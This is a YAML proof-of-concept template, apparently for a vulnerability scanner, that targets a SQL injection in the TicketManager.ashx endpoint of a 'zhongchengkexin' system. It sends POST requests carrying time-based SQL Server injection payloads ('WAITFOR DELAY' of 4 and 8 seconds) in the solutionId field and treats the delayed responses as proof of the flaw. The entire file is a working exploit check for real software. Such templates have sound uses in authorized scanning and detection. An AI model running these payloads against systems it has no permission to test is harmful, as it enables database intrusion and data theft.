name: poc-yaml-zhongchengkexin-TicketManager.ashx-sql
transport: http



rules:
  r0:
    request:
      method: POST
      path: /SystemManager/Api/TicketManager.ashx
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
      body: Method=GetReServeOrder&solutionId=1' WAITFOR DELAY '0:0:4'--
    expression: response.latency >= 4000 && response.latency <= 5000
  r1:
    request:
      method: POST
      path: /SystemManager/Api/TicketManager.ashx
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
      body: Method=GetReServeOrder&solutionId=1' WAITFOR DELAY '0:0:8'--
    expression: response.latency >= 8000 && response.latency <= 9000

expression: r0() && r1()
 
